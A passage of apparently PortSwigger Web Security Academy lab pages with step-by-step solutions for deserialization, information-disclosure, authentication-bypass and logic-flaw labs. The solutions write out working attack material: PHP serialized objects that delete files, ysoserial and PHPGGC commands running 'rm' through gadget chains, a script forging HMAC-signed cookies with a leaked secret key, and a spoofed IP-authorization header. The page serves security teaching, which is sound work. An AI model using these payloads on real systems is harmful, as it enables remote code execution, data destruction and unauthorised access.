                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in to your own account. On the "My account" page, notice the option to delete
                                    your account by sending a
                                    <code>
        POST
       </code>
                                    request to
                                    <code>
        /my-account/delete
       </code>
                                    .
                                </li>
                                <li>
                                    Send a request containing a session cookie to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, study the session cookie using the Inspector panel. Notice that
                                    the serialized object has an
                                    <code>
        avatar_link
       </code>
                                    attribute, which contains the file path to your avatar.
                                </li>
                                <li>
                                    <p>
                                        Edit the serialized data so that the
                                        <code>
         avatar_link
        </code>
                                        points to
                                        <code>
         /home/carlos/morale.txt
        </code>
                                        . Remember to update the length indicator. The modified attribute should look
                                        like this:
                                    </p>
                                    <code class="code-scrollable">
        s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
       </code>
                                </li>
                                <li>
                                    Click "Apply changes". The modified object will automatically be re-encoded and
                                    updated in the request.
                                </li>
                                <li>
                                    Change the request line to
                                    <code>
        POST /my-account/delete
       </code>
                                    and send the request. Your account will be deleted, along with Carlos's
                                    <code>
        morale.txt
       </code>
                                    file.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Arbitrary object injection in PHP
                (deserialization)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as
                a result. To solve the lab, create and inject a malicious serialized object to delete the
                <code>
   morale.txt
  </code>
                file from Carlos's home directory. You will need to obtain source code access to solve this lab.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You can sometimes read source code by appending a tilde (
                                <code>
       ~)
      </code>
                                to a filename to retrieve an editor-generated backup file.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/5ce272b4b2a84159f707a668e2cae9811a2f787c9eb75229368cc6fe2a7f53db?referrer=%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-arbitrary-object-injection-in-php"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in to your own account and notice the session cookie contains a serialized PHP
                                    object.
                                </li>
                                <li>
                                    From the site map, notice that the website references the file
                                    <code>
        /libs/CustomTemplate.php
       </code>
                                    . Right-click on the file and select "Send to Repeater".
                                </li>
                                <li>
                                    In Burp Repeater, notice that you can read the source code by appending a tilde (
                                    <code>
        ~
       </code>
                                    ) to the filename in the request line.
                                </li>
                                <li>
                                    In the source code, notice the
                                    <code>
        CustomTemplate
       </code>
                                    class contains the
                                    <code>
        __destruct()
       </code>
                                    magic method. This will invoke the
                                    <code>
        unlink()
       </code>
                                    method on the
                                    <code>
        lock_file_path
       </code>
                                    attribute, which will delete the file on this path.
                                </li>
                                <li>
                                    <p>
                                        In Burp Decoder, use the correct syntax for serialized PHP data to create a
                                        <code>
         CustomTemplate
        </code>
                                        object with the
                                        <code>
         lock_file_path
        </code>
                                        attribute set to
                                        <code>
         /home/carlos/morale.txt
        </code>
                                        . Make sure to use the correct data type labels and length indicators. The final
                                        object should look like this:
                                    </p>
                                    <code class="code-scrollable">
        O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
       </code>
                                </li>
                                <li>
                                    Base64 and URL-encode this object and save it to your clipboard.
                                </li>
                                <li>
                                    Send a request containing the session cookie to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, replace the session cookie with the modified one in your
                                    clipboard.
                                </li>
                                <li>
                                    Send the request. The
                                    <code>
        __destruct()
       </code>
                                    magic method is automatically invoked and will delete Carlos's file.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting Java
                <a href="https://portswigger.net/web-security/deserialization">
                    deserialization
                </a>
                with Apache Commons
                (deserialization)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library.
                Although you don't have source code access, you can still exploit this lab using pre-built gadget
                chains.
            </p>
            <p>
                To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote
                code execution payload. Then, pass this object into the website to delete the
                <code>
   morale.txt
  </code>
                file from Carlos's home directory.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/02e0388c9613d9b7e6fb892294c7c72f478d94e413bb333920127e09c26fde35?referrer=%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-exploiting-java-deserialization-with-apache-commons"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                In Java versions 16 and above, you need to set a series of command-line arguments for
                                Java to run ysoserial. For example:
                            </p>
                            <code class="code-scrollable">
      java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   [payload] '[command]'
     </code>
                        </div>
                    </div>
                </details>
            </div>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in to your own account and observe that the session cookie contains a serialized
                                    Java object. Send a request containing your session cookie to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        Download the "ysoserial" tool and execute the following command. This generates
                                        a Base64-encoded serialized object containing your payload:
                                    </p>
                                    <ul>
                                        <li>
                                            <p>
                                                In Java versions 16 and above:
                                            </p>
                                            <code class="code-scrollable">
          java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   CommonsCollections4 'rm /home/carlos/morale.txt' | base64
         </code>
                                        </li>
                                        <li>
                                            <p>
                                                In Java versions 15 and below:
                                            </p>
                                            <code class="code-scrollable">
          java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
         </code>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    In Burp Repeater, replace your session cookie with the malicious one you just
                                    created. Select the entire cookie and then URL-encode it.
                                </li>
                                <li>
                                    Send the request to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting PHP
                <a href="https://portswigger.net/web-security/deserialization">
                    deserialization
                </a>
                with a pre-built gadget chain
                (deserialization)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common
                PHP framework. Although you don't have source code access, you can still exploit this lab's
                <a href="https://portswigger.net/web-security/deserialization">
                    insecure deserialization
                </a>
                using pre-built gadget chains.
            </p>
            <p>
                To solve the lab, identify the target framework then use a third-party tool to generate a malicious
                serialized object containing a remote code execution payload. Then, work out how to generate a valid
                signed cookie containing your malicious object. Finally, pass this into the website to delete the
                <code>
   morale.txt
  </code>
                file from Carlos's home directory.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/4bc929cce2fbdca5eaedc69bb4ab6f1d21c3960cb0212b5d72a5128eb6efc371?referrer=%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in and send a request containing your session cookie to Burp Repeater. Highlight
                                    the cookie and look at the
                                    <strong>
                                        Inspector
                                    </strong>
                                    panel.
                                </li>
                                <li>
                                    Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC
                                    hash.
                                </li>
                                <li>
                                    Copy the decoded cookie from the
                                    <strong>
                                        Inspector
                                    </strong>
                                    and paste it into Decoder.
                                </li>
                                <li>
                                    In Decoder, highlight the token and then select
                                    <strong>
                                        Decode as &gt; Base64
                                    </strong>
                                    . Notice that the token is actually a serialized PHP object.
                                </li>
                                <li>
                                    In Burp Repeater, observe that if you try sending a request with a modified cookie,
                                    an exception is raised because the digital signature no longer matches. However, you
                                    should notice that:
                                    <ul>
                                        <li>
                                            A developer comment discloses the location of a debug file at
                                            <code>
          /cgi-bin/phpinfo.php
         </code>
                                            .
                                        </li>
                                        <li>
                                            The error message reveals that the website is using the Symfony 4.3.6
                                            framework.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    Request the
                                    <code>
        /cgi-bin/phpinfo.php
       </code>
                                    file in Burp Repeater and observe that it leaks some key information about the
                                    website, including the
                                    <code>
        SECRET_KEY
       </code>
                                    environment variable. Save this key; you'll need it to sign your exploit later.
                                </li>
                                <li>
                                    <p>
                                        Download the "PHPGGC" tool and execute the following command:
                                    </p>
                                    <code class="code-scrollable">
        ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
       </code>
                                    <p>
                                        This will generate a Base64-encoded serialized object that exploits an RCE
                                        gadget chain in Symfony to delete Carlos's
                                        <code>
         morale.txt
        </code>
                                        file.
                                    </p>
                                </li>
                                <li>
                                    You now need to construct a valid cookie containing this malicious object and sign
                                    it correctly using the secret key you obtained earlier. You can use the following
                                    PHP script to do this. Before running the script, you just need to make the
                                    following changes:
                                    <ul>
                                        <li>
                                            Assign the object you generated in PHPGGC to the
                                            <code>
          $object
         </code>
                                            variable.
                                        </li>
                                        <li>
                                            Assign the secret key that you copied from the
                                            <code>
          phpinfo.php
         </code>
                                            file to the
                                            <code>
          $secretKey
         </code>
                                            variable.
                                        </li>
                                    </ul>
                                    <code class="code-scrollable">
        &lt;?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
       </code>
                                    <p>
                                        This will output a valid, signed cookie to the console.
                                    </p>
                                </li>
                                <li>
                                    In Burp Repeater, replace your session cookie with the malicious one you just
                                    created, then send the request to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting Ruby deserialization using a documented gadget chain
                (deserialization)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are
                documented exploits that enable remote code execution via a gadget chain in this framework.
            </p>
            <p>
                To solve the lab, find a documented exploit and adapt it to create a malicious serialized object
                containing a remote code execution payload. Then, pass this object into the website to delete the
                <code>
   morale.txt
  </code>
                file from Carlos's home directory.
            </p>
            <p>
                You can log in to your own account using the following credentials: wiener:peter
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Try searching for "ruby
                                <a href="https://portswigger.net/web-security/deserialization">
                                    deserialization
                                </a>
                                gadget chain" online.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/c911d0a4c35afb75a94e7710baa76c14054cc1bc85b79632e70e049ed992fc02?referrer=%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in to your own account and notice that the session cookie contains a serialized
                                    ("marshaled") Ruby object. Send a request containing this session cookie to Burp
                                    Repeater.
                                </li>
                                <li>
                                    Browse the web to find the
                                    <code>
        Universal Deserialisation Gadget for Ruby 2.x-3.x
       </code>
                                    by
                                    <code>
        vakzz
       </code>
                                    on
                                    <code>
        devcraft.io
       </code>
                                    . Copy the final script for generating the payload.
                                </li>
                                <li>
                                    Modify the script as follows:
                                    <ul>
                                        <li>
                                            Change the command that should be executed from
                                            <code>
          id
         </code>
                                            to
                                            <code>
          rm /home/carlos/morale.txt
         </code>
                                            .
                                        </li>
                                        <li>
                                            Replace the final two lines with
                                            <code>
          puts Base64.encode64(payload)
         </code>
                                            . This ensures that the payload is output in the correct format for you to
                                            use for the lab.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    Run the script and copy the resulting Base64-encoded object.
                                </li>
                                <li>
                                    In Burp Repeater, replace your session cookie with the malicious one that you just
                                    created, then URL encode it.
                                </li>
                                <li>
                                    Send the request to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/information-disclosure">
                    Information disclosure
                </a>
                in error messages
                (information-disclosure)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab's verbose error messages reveal that it is using a vulnerable version of a third-party
                framework. To solve the lab, obtain and submit the version number of this framework.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/8743ae75bedd9ef19ce2134472f6df1c700ed51e9a571f0b56ae678ec844177a?referrer=%2fweb-security%2finformation-disclosure%2fexploiting%2flab-infoleak-in-error-messages"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, open one of the product pages.
                                </li>
                                <li>
                                    In Burp, go to "Proxy" &gt; "HTTP history" and notice that the
                                    <code>
        GET
       </code>
                                    request for product pages contains a
                                    <code>
        productID
       </code>
                                    parameter. Send the
                                    <code>
        GET /product?productId=1
       </code>
                                    request to Burp Repeater. Note that your
                                    <code>
        productId
       </code>
                                    might be different depending on which product page you loaded.
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, change the value of the
                                        <code>
         productId
        </code>
                                        parameter to a non-integer data type, such as a string. Send the request:
                                    </p>
                                    <code class="code-scrollable">
        GET /product?productId="example"
       </code>
                                </li>
                                <li>
                                    The unexpected data type causes an exception, and a full stack trace is displayed in
                                    the response. This reveals that the lab is using Apache Struts 2 2.3.31.
                                </li>
                                <li>
                                    Go back to the lab, click "Submit solution", and enter
                                    <strong>
                                        2 2.3.31
                                    </strong>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/information-disclosure">
                    Information disclosure
                </a>
                on debug page
                (information-disclosure)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a debug page that discloses sensitive information about the application. To solve the
                lab, obtain and submit the
                <code>
   SECRET_KEY
  </code>
                environment variable.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/18ebd0ac7489cd1770d58baec6ec290f6d15c7346d25a11f0e64cc1ad3329348?referrer=%2fweb-security%2finformation-disclosure%2fexploiting%2flab-infoleak-on-debug-page"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, browse to the home page.
                                </li>
                                <li>
                                    Go to the "Target" &gt; "Site Map" tab. Right-click on the top-level entry for the
                                    lab and select "Engagement tools" &gt; "Find comments". Notice that the home page
                                    contains an HTML comment that contains a link called "Debug". This points to
                                    <code>
        /cgi-bin/phpinfo.php
       </code>
                                    .
                                </li>
                                <li>
                                    In the site map, right-click on the entry for
                                    <code>
        /cgi-bin/phpinfo.php
       </code>
                                    and select "Send to Repeater".
                                </li>
                                <li>
                                    In Burp Repeater, send the request to retrieve the file. Notice that it reveals
                                    various debugging information, including the
                                    <code>
        SECRET_KEY
       </code>
                                    environment variable.
                                </li>
                                <li>
                                    Go back to the lab, click "Submit solution", and enter the
                                    <code>
        SECRET_KEY
       </code>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Source code disclosure via backup files
                (information-disclosure)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and
                submit the database password, which is hard-coded in the leaked source code.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/2ef78ab0fd73d035439230bb1d8172796d5d9d0be65f1476072db63c5cd95c04?referrer=%2fweb-security%2finformation-disclosure%2fexploiting%2flab-infoleak-via-backup-files"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Browse to
                                    <code>
        /robots.txt
       </code>
                                    and notice that it reveals the existence of a
                                    <code>
        /backup
       </code>
                                    directory. Browse to
                                    <code>
        /backup
       </code>
                                    to find the file
                                    <code>
        ProductTemplate.java.bak
       </code>
                                    . Alternatively, right-click on the lab in the site map and go to "Engagement tools"
                                    &gt; "Discover content". Then, launch a content discovery session to discover the
                                    <code>
        /backup
       </code>
                                    directory and its contents.
                                </li>
                                <li>
                                    Browse to
                                    <code>
        /backup/ProductTemplate.java.bak
       </code>
                                    to access the source code.
                                </li>
                                <li>
                                    In the source code, notice that the connection builder contains the hard-coded
                                    password for a Postgres database.
                                </li>
                                <li>
                                    Go back to the lab, click "Submit solution", and enter the database password to
                                    solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Authentication bypass via
                <a href="https://portswigger.net/web-security/information-disclosure">
                    information disclosure
                </a>
                (information-disclosure)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab's administration interface has an authentication bypass vulnerability, but it is impractical to
                exploit without knowledge of a custom HTTP header used by the front-end.
            </p>
            <p>
                To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the
                admin interface and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/2c1ffa3c35d94beac72d213f5134c9b53f43a31758c8a61bc1a4d3bd8153c226?referrer=%2fweb-security%2finformation-disclosure%2fexploiting%2flab-infoleak-authentication-bypass"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    In Burp Repeater, browse to
                                    <code>
        GET /admin
       </code>
                                    . The response discloses that the admin panel is only accessible if logged in as an
                                    administrator, or if requested from a local IP.
                                </li>
                                <li>
                                    <p>
                                        Send the request again, but this time use the
                                        <code>
         TRACE
        </code>
                                        method:
                                    </p>
                                    <code class="code-scrollable">
        TRACE /admin
       </code>
                                </li>
                                <li>
                                    Study the response. Notice that the
                                    <code>
        X-Custom-IP-Authorization
       </code>
                                    header, containing your IP address, was automatically appended to your request. This
                                    is used to determine whether or not the request came from the
                                    <code>
        localhost
       </code>
                                    IP address.
                                </li>
                                <li>
                                    <p>
                                        Go to "Proxy" &gt; "Options", scroll down to the "Match and Replace" section,
                                        and click "Add". Leave the match condition blank, but in the "Replace" field,
                                        enter:
                                    </p>
                                    <code class="code-scrollable">
        X-Custom-IP-Authorization: 127.0.0.1
       </code>
                                    <p>
                                        Burp Proxy will now add this header to every request you send.
                                    </p>
                                </li>
                                <li>
                                    Browse to the home page. Notice that you now have access to the admin panel, where
                                    you can delete
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/information-disclosure">
                    Information disclosure
                </a>
                in version control history
                (information-disclosure)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab discloses sensitive information via its version control history. To solve the lab, obtain the
                password for the
                <code>
   administrator
  </code>
                user then log in and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/45ef28e2b8b6f9b623c8d0485cb4e2b7ded96458fedd8d7d5e0adf9427a5d3af?referrer=%2fweb-security%2finformation-disclosure%2fexploiting%2flab-infoleak-in-version-control-history"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Open the lab and browse to
                                    <code>
        /.git
       </code>
                                    to reveal the lab's Git version control data.
                                </li>
                                <li>
                                    <p>
                                        Download a copy of this entire directory. For Linux users, the easiest way to do
                                        this is using the command:
                                    </p>
                                    <code class="code-scrollable">
        wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/
       </code>
                                    <p>
                                        Windows users will need to find an alternative method, or install a UNIX-like
                                        environment, such as Cygwin, in order to use this command.
                                    </p>
                                </li>
                                <li>
                                    Explore the downloaded directory using your local Git installation. Notice that
                                    there is a commit with the message
                                    <code>
        "Remove admin password from config"
       </code>
                                    .
                                </li>
                                <li>
                                    Look closer at the diff for the changed
                                    <code>
        admin.conf
       </code>
                                    file. Notice that the commit replaced the hard-coded admin password with an
                                    environment variable
                                    <code>
        ADMIN_PASSWORD
       </code>
                                    instead. However, the hard-coded password is still clearly visible in the diff.
                                </li>
                                <li>
                                    Go back to the lab and log in to the administrator account using the leaked
                                    password.
                                </li>
                                <li>
                                    To solve the lab, open the admin interface and delete
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Excessive trust in client-side controls
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow
                to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ca187b1fb490deddce4034d443cb9afbf5b8279422a765b7d48040c50f327e9b?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-excessive-trust-in-client-side-controls"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    With Burp running, log in and attempt to buy the leather jacket. The order is
                                    rejected because you don't have enough store credit.
                                </li>
                                <li>
                                    In Burp, go to "Proxy" &gt; "HTTP history" and study the order process. Notice that
                                    when you add an item to your cart, the corresponding request contains a
                                    <code>
        price
       </code>
                                    parameter. Send the
                                    <code>
        POST /cart
       </code>
                                    request to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, change the price to an arbitrary integer and send the request.
                                    Refresh the cart and confirm that the price has changed based on your input.
                                </li>
                                <li>
                                    Repeat this process to set the price to any amount less than your available store
                                    credit.
                                </li>
                                <li>
                                    Complete the order to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: High-level logic vulnerability
                (logic-flaws)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow
                to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/8593e55b788d1c4403ccad45020972079a8e89c5669ecf6d9be2cd5c69c77877?referrer=%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-high-level"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
